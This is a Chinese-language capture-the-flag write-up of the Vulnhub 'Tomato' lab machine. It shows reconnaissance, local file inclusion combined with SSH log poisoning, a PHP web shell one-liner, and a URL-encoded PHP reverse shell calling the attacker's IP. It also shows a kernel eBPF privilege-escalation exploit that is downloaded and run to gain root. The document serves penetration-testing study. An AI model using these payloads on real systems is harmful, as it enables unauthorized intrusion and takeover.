# 靶机信息
Tomato是vulnhub中的一台中级难度的渗透测试靶机。

# 信息收集
## Nmap扫描
```
# Nmap 7.95 scan initiated Fri Nov 14 02:48:40 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p21,80,2211,8888 -O --min-rate 10000 -oA nmapScan/details 192.168.218.217
Nmap scan report for 192.168.218.217 (192.168.218.217)
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tomato
2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:53:0a:91:8c:f1:a6:10:11:0d:9e:0f:22:f8:49:8e (RSA)
|   256 b3:12:60:32:48:28:eb:ac:80:de:17:d7:96:77:6e:2f (ECDSA)
|_  256 36:6f:52:ad:fe:f7:92:3e:a2:51:0f:73:06:8d:80:13 (ED25519)
8888/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: 401 Authorization Required
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Private Property
MAC Address: 00:0C:29:08:A8:FC (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## 初步信息枚举
先看优先级高的FTP端口，尝试匿名用户登录，失败，挂一个爆破然后看web端口。

先看80端口，只有一个tomato~~

<img width="1919" height="975" alt="Image" src="https://github.com/user-attachments/assets/f4c02607-0f5f-4c51-9c01-428212efd03e" />

看一下源码，有类似凭据或者提示的代码，存起来，也可以直接cewl扒取页面，制作字典。

<img width="1919" height="627" alt="Image" src="https://github.com/user-attachments/assets/8536122d-854b-4a77-a2ce-6f4cea5a7dfa" />

爆破一下目录，啥也没有。那就看8888端口的web服务。需要验证拿刚刚的字典没有爆出来，自己的字典也没爆出来，目录也扫不到。然后卡死了...

一直卡卡卡卡卡卡卡卡，实在没招了搜一下wp，第一眼就看到是web的入口，但是web啥也没有啊，我感觉的目录字典的问题，然后我换字典扫

```
└─$ dirsearch -u http://192.168.218.217/ -w /usr/share/wordlists/dirb/common.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4613

Output File: /home/kali/RedteamStu/stageTwo/writeup/vulnhub/Tomato/reports/http_192.168.218.217/__25-11-16_21-06-58.txt

Target: http://192.168.218.217/

[21:06:58] Starting: 
[21:06:59] 301 -  326B  - /antibot_image  ->  http://192.168.218.217/antibot_image/
[21:07:09] 403 -  280B  - /server-status                                    
                                                                             
Task Completed
```

真有新货，果然是字典的问题。

<img width="1919" height="963" alt="Image" src="https://github.com/user-attachments/assets/a462d859-6088-4032-a148-d11998b0e826" />

是一个目录，我习惯性的打开开发者工具翻翻看看，然后翻到phpinfo页面发现了注释

<img width="1919" height="937" alt="Image" src="https://github.com/user-attachments/assets/b2d917af-de59-4820-8f92-3fc5258f5759" />

很直白的提示，可以直接用，没有什么限制

<img width="1919" height="980" alt="Image" src="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361" />

# 漏洞利用

本来我感觉是让我包含服务目录相关的配置文件，但是始终找不到包含的文件，然后尝试包含一些登录凭据文件，也没成功。后面了解到，ssh的log文件在 **/var/log/auth.log**，然后由于靶机中文件包含是可以执行php代码，所以可以尝试使用一些php代码作为用户名登录ssh，引发报错之后，包含log文件就会导致代码执行。

我是想直接写反向shell进去的，但是里面包含太多的符号，我怎么转义都过不了，后来发现是ssh版本高了，尝试降，想了一下直接用xshell好像就可以，但是直接打反向shell，不知道是太长了还是什么，代码不会完整的进log文件，最后尝试写一句话木马，发现是可以写进去的 **<?php system($_GET["cmd"]); ?>**

然后我尝试了非常多的反向shell最后发现只有php的socket能打回来，然后开始提权。
一定记得编码一下，然后多试错，不然会导致被系统反正很多因素过滤，导致payload出错，这是我的`http://192.168.218.217/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=php+-r+%27%24sock%3dfsockopen(%22192.168.218.148%22%2c4444)%3bexec(%22%2fbin%2fsh+-i+%3c%263+%3e%263+2%3e%263%22)%3b%27`



# 提权
拿到shell之后直接上linpeas扫，感觉最大可能就是内核漏洞了，但是靶机中没有编译程序，难度有提升了。

<img width="1919" height="718" alt="Image" src="https://github.com/user-attachments/assets/92520c5c-dd9f-4e85-922b-a821981db918" />

优先先跟着linpeas的结果进行内核提权，脏牛给我靶机跑崩了，**[CVE-2017-16995] eBPF_verifier**成功了。

现在的问题是动态链接到 libc.so.6，而且Kali 上的 glibc 2.34，
到靶机上运行时，会去找靶机的 /lib/x86_64-linux-gnu/libc.so.6，结果版本太旧导致报错。

那干脆=不动态链接了，直接静态链接，把 libc 全塞进二进制里，让程序不再依赖靶机的 glibc。

`gcc -static 45010.c -o 123_static`

```
www-data@ubuntu:/tmp$ wget http://192.168.218.148:8000/123_static
wget http://192.168.218.148:8000/123_static
--2025-11-17 20:48:12--  http://192.168.218.148:8000/123_static
Connecting to 192.168.218.148:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 803272 (784K)
Saving to: '123_static'

123_static          100%[===================>] 784.45K  --.-KB/s    in 0.01s   

2025-11-17 20:48:12 (65.6 MB/s) - '123_static' saved [803272/803272]

www-data@ubuntu:/tmp$ chmod +x 123_static
chmod +x 123_static
www-data@ubuntu:/tmp$ ./123_static
./123_static
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880035404b00
[*] Leaking sock struct from ffff8801378ebc00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff8801379a4180
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff8801379a4180
[*] credentials patched, launching shell...
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# whoami
whoami
root
# 
```
成功提权了。

# 反思
这个靶机可是消耗的我很多时间消化，前期的信息收集，可以更换一些其他的字典扫描，不然容易卡死，然后涉及文件包含和日志投毒的结合，和经典，但是这其中也有很多问题，payload的编码，以及服务器和系统对于payload的字符写入规则，都会导致payload无法顺利的进入日志。就算成功打进去了，也还是可能在反弹shell的时候，把你的反弹代码也给分割，解析掉，导致一直反弹不出来shell，由于是黑盒，整个过程都需要不断的试错，可能稍不注意就会放弃，最后提权的时候，我开始是直接使用search找的内核漏洞，直接打的，尝试了很多都是直接把靶机打崩了，最后才看linpeas的内核提权建议，多走了几步弯路，看似上面的wp很少，但是我花了很多时间打这台靶机，吃透靶机。